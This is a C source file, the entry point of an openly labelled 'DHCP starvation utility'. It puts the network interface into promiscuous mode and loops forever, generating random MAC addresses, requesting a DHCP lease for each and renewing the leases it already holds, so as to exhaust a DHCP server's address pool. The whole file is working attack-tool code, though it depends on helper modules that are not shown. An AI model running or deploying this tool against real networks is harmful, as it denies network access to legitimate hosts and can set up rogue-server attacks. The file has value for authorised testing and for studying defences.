/*
 * main.c: entry point.
 *
 * Copyright (C) 2007 Dmitry Davletbaev <ddo@mgn.ru>
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation, either version 3 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <signal.h>
#include <errno.h>

#include "main.h"
#include "leases.h"
#include "request.h"
#include "dhcp.h"
#include "utils.h"
#include "log.h"
#include "sock.h"
#include "ether.h"

#include "config.h"


/* Application options. */
struct app_options opts;

/* Network interface hardware address. */
unsigned char ifmac[6];

/* Network interface number. */
int ifindex = 0;

/* Max. leases to renew at once. */
static const int max_renew_leases = 100;

/* Sockets. */
static int sock_recv = -1;
static int sock_send = -1;

/* not 0 if promiscuous mode was set */
static int promisc = 0;

/*
 * Request time and retry count (DHCPDISCOVER and DHCPREQUEST, in seconds).
 * These values should be kept small to reduce overall run time.
 */ 
static const int request_retries = 2;

static const int request_timeout = 2;


/*
 * Renew leases (see max_renew_leases also).
 */
void renew_all_leases(int sock_send, int sock_recv)
{
	struct dhcp_lease* lease = ls_get_first_lease();
	uint32_t now, renewal_time;
	int renewed_count = 0;

	assert(sock_send != -1);
	assert(sock_recv != -1);

	now = time(NULL);

	while (lease != NULL) {
		renewal_time = ntohl(lease->renewal_time);

		/* DHCPDISCOVER in progress */
		if (lease->last_updated == 0)
			goto NextLease;
		/* not renewed */
		if (renewal_time < (now - lease->last_updated))
			goto NextLease;

		if ((now - lease->last_updated) > (renewal_time / 3)) {
			if (0 == renew_lease(sock_send, sock_recv, lease,
						request_timeout,
						request_retries))
				renewed_count++;
			if (renewed_count > max_renew_leases)
				break;
		}
NextLease:
		lease = lease->next;
	}
}

/*
 * Generate random hardware address. `buffer' size must be at least
 * DHCP_HLEN_ETHER.
 */
void generate_mac(void* buffer)
{
	unsigned char* mac = buffer;
	int random_value = rand();
	/* first 3 octets - vendor id */
	unsigned char vendor_mac_prefix[] = { 0x00, 0x16, 0x36 };

	assert(buffer);
	memcpy(mac, vendor_mac_prefix, sizeof(vendor_mac_prefix));
	memcpy(mac + sizeof(vendor_mac_prefix), (unsigned char*) &random_value,
			DHCP_HLEN_ETHER - sizeof(vendor_mac_prefix));
}

/*
 * Free allocated resources and exit.
 */
void shutdown_app()
{
	ls_free_all_leases();

	if (promisc != 0)
		set_promisc_mode(sock_recv, opts.ifname, 0);

	if (sock_recv != -1) {
		close(sock_recv);
		sock_recv = -1;
	}
	if (sock_send != -1) {
		close(sock_send);
		sock_send = -1;
	}

	log_verbose("Exit.");
	exit(0);
}

/*
 * Signal handler.
 */
void signal_handler(int signum)
{
	if (signum == SIGTERM || signum == SIGINT || signum == SIGQUIT)
		shutdown_app();
}

/*
 * Print copyright notice.
 */
void print_notice()
{
	printf("Copyright (C) 2007 Dmitry Davletbaev\n"
			"This program comes with ABSOLUTELY NO WARRANTY.\n"
			"This is free software, and you are welcome to "
			"redistribute it under\ncertain conditions; see "
			"<http://www.gnu.org/licenses/> for details.\n\n");
}

/*
 * Print short help.
 */
void print_help()
{
	printf("%s - DHCP starvation utility.\nversion %s\n\n"
			"Usage:\n"
			"\t%s -h\n\n"
			"\t%s [-epv] -i IFNAME\n\n"
			"Options:\n"
			"\t-e, --exclude=ADDRESS\n"
			"\t\tIgnore replies from server with address ADDRESS.\n"
			"\t-h, --help\n"
			"\t\tPrint help and exit.\n"
			"\t-i, --iface=IFNAME\n"
			"\t\tInterface name.\n"
			"\t-p, --no-promisc\n"
			"\t\tDo not set network interface to promiscuous mode.\n"
			"\t-v, --verbose\n"
			"\t\tVerbose output.\n",
			PROGNAME, PACKAGE_VERSION, PROGNAME, PROGNAME);
}

/*
 * Parse command line options. Return 0 if successful.
 */
int parce_cmd_options(int argc, char* argv[])
{
	struct option long_opts[] = {
		{ "exclude", required_argument, NULL, 'e' },
		{ "iface", required_argument, NULL, 'i' },
		{ "no-promisc", no_argument, NULL, 'p' },
		{ "verbose", no_argument, NULL, 'v' },
		{ "help", no_argument, NULL, 'h' }
	};
	int optind = 0, opt;

	memset(&opts, 0, sizeof(opts));

	while (-1 != (opt = getopt_long(argc, argv, "e:i:hpv", long_opts, &optind))) {
		switch (opt) {
		case 0:
			break;
		case 'e':
			if (0 == (opts.exclude_server = strip_to_int(optarg))) {
				log_err("bad server ID (must be valid IP"
					" address): %s", optarg);
				return -1;
			}
			break;
		case 'i':
			strncpy(opts.ifname, optarg, sizeof(opts.ifname));
			break;
		case 'v':
			opts.verbose = 1;
			break;
		case 'h':
			opts.help = 1;
			break;
		case 'p':
			opts.no_promisc = 1;
			break;
		case '?':
			return -1;
			break;
		default:
			log_err("unknown command line option %s",
					long_opts[optind].name);
			return -1;
		}
	}

	return 0;
}

/*
 * Entry point.
 */
int main(int argc, char* argv[])
{
	unsigned char mac[DHCP_HLEN_ETHER];
	int signals[] = { SIGTERM, SIGINT, SIGQUIT };
	int i;

	if (0 != parce_cmd_options(argc, argv))
		return -1;

	if (opts.help || opts.verbose)
		print_notice();

	if (opts.help) {
		print_help();
		exit(0);
	}

	srand(time(NULL));

	/* set up signal handler */
	for (i = 0; i < (sizeof(signals) / sizeof(int)); i++) {
		if (SIG_ERR == signal(signals[i], signal_handler)) {
			log_err("can not set up signal handler: %s",
					strerror(errno));
			return -1;
		}
	}

	sock_recv = create_recv_socket();
	sock_send = create_send_socket();
	if (-1 == sock_recv || -1 == sock_send)
		return -1;

	if (-1 == get_iface_hwaddr(sock_send, opts.ifname, ifmac,
				sizeof(ifmac))) {
		return -1;
	}

	if (-1 == (ifindex = get_iface_index(sock_send, opts.ifname)))
		return -1;

	if (!opts.no_promisc) {
		if (-1 == (promisc = set_promisc_mode(sock_recv, opts.ifname,
						1))) {
			return -1;
		}
	}

	while (1) {
		renew_all_leases(sock_send, sock_recv);

		generate_mac(mac);
		request_lease(sock_send, sock_recv, mac, request_timeout,
				request_retries);
	}

	shutdown_app();

	return 0;
}

